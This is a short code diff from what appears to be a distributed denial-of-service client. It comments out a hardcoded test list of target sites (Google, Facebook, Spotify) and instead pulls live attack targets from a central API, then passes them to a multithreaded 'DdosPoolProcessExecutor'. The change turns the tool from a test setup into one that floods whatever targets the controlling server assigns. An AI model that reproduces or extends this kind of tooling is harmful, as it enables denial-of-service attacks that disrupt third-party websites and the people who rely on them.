@@ -10,8 +10,8 @@ def main():
     client_name = args.name
 
     api_instance = ApiClient(url=API_HOST, client_name=client_name)
-    # urls_to_attack = api_instance.get_active_tasks()
-    urls_to_attack = ['https://google.com', 'https://facebook.com', 'https://spotify.com']
+    urls_to_attack = api_instance.get_active_tasks()
+    # urls_to_attack = ['https://google.com', 'https://facebook.com', 'https://spotify.com']
 
     executor = DdosPoolProcessExecutor(urls_to_attack, threads_count, api_instance)
     executor.start()
